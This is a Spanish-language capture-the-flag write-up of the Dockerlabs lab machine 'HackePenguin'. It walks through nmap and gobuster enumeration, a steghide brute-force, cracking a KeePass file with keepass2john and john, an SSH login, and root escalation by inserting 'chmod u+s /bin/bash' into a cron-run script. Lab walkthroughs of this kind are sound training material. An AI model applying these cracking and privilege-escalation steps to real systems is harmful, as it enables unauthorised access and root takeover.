Máquina HackePenguin

Iniciamos con mi rutina básica de reconocimiento de nmap:

```
sudo nmap -p- --open -sSCV --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oN Target
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 fa:13:95:24:c7:08:e8:36:51:6d:ab:b2:e5:3e:3b:da (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNVFhFPx46QZ+sM4vC3yecbwD2hDgxKBg8x/alXdgL/ojBUsbliyqCPFfQ08+WTNu+4fipx7zg9V8ZjKDxFmBnw=
|   256 e2:f3:81:1f:7d:d0:ea:ed:e0:c6:38:11:ed:95:3a:38 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIWG6446chvKHIhxdIVHwcEw1kXFORyLzANPqUKTdCku
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


Bueno pues vemos una página web y un ssh activo, vamos a enumerar la página web:

![image](https://github.com/FakeLuci/Dockerlabs-Writeps/assets/96147300/c964245a-da2d-4e32-aabe-ca9296101542)

Bueno es un apache por defecto, vamos a fuzzear un poco a ver si encontramos algo:

```
gobuster dir -u "http://172.17.0.2" -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10671]
/penguin.html         (Status: 200) [Size: 342]
/.html                (Status: 403) [Size: 275]
Progress: 406141 / 4741020 (8.57%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 407142 / 4741020 (8.59%)
===============================================================
Finished
===============================================================
```

Ya hemos encontrado cositas, vamos a verlo:

![image](https://github.com/FakeLuci/Dockerlabs-Writeps/assets/96147300/266c4060-d7fd-4713-a74c-863dab65d04d)

No vemos nada a priori, vamos a ver la imagen, que es lo unico que tenemos de valor, así que por probar vamos a descargarnos la imagen con 
wget la imagen y a meterle un rockyou con stegide:

Para hacer fuerza bruta con steghide tengo un repositorio: https://github.com/FakeLuci/brute-force-on-steghide.git

Configuramos el script y encontramos que la contraseña es chocolate:

![image](https://github.com/FakeLuci/Dockerlabs-Writeps/assets/96147300/5a02c44d-d5df-49ea-89f7-ffdb337598ee)

Al parecer hemos extraido un archivo penguin.kdbx, sinceramente no tengo ni idea de que es un archivo .kdbx, investigando he encontrado que
es un archivo de keepass, pues bueno vamos a descargarnos keepass para ver que hay dentro:

Intentamos entrar al archivo de keepas para ver uqe hay dentro:

```
keepass2 penguin.kdbx
```

![image](https://github.com/FakeLuci/Dockerlabs-Writeps/assets/96147300/6992b937-9586-44d7-bc76-9aa94ef39bce)

Bueno al parecer la contraseña chocolate no es la contraseña master de este archivo, he estado investigando en internet y este mismo archivo se puede desencriptar con john
de la siguiente manera:

```
keepass2john penguin.kdbx > password
john password
```

![image](https://github.com/FakeLuci/Dockerlabs-Writeps/assets/96147300/4e435199-8253-4afb-a3fa-1c1ea3c9e682)

Pues si sabemos que la paswword de el archivo es "password1" pues entramos en el archivo

![image](https://github.com/FakeLuci/Dockerlabs-Writeps/assets/96147300/7100dbf4-a2c7-4ab7-8b78-f6ef569e6de4)

teniendo estas credenciales ahora podemos entrar por ssh:

Bueno pues probando con el usuario pinguino no va, he probado con penguin y ahora si va, vamos a ver uqe hay dentro:

Una vez dentro utilizamos el siguiiente comando para mejorar la consola:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Bueno nada mas entrar he hecho ls y he encontrado un script bastante tentador, vamos a ver si es una tarea cron con el siguinete script:

```
#!/bin/bash

old_process=$(ps -eo user,command)

while true; do
    new_process=$(ps -eo user,command)
    diff <(echo "$old_process") <(echo "$new_process") | grep "^[<>]" | grep -vE "procmon|command|kworker"
    old_process=$new_process
done
```

y bueno de primeras ya vemos que se ejecuta muchisimas veces uspongo que estara cada segundo o algo así:

![image](https://github.com/FakeLuci/Dockerlabs-Writeps/assets/96147300/e78f8f5a-4920-40b7-bcac-8cd18230f396)

pues bueno tan simple como poner dentro de este script: chmod u+s /bin/bash

![image](https://github.com/FakeLuci/Dockerlabs-Writeps/assets/96147300/9069eee9-b0ee-49e7-8e67-34bc4ae2908b)

Esta máquina me ha gustado mucho ya que he aprendido a saber y desencriptar que es un archivo .kdbx y a utilizar keepass2
ademas de utilizar unas cuantas herramientas scripteadas sin tener que hacer copia y pega como el script de steghide y el procmon

Dificultado 2/5
Diversión 2/5




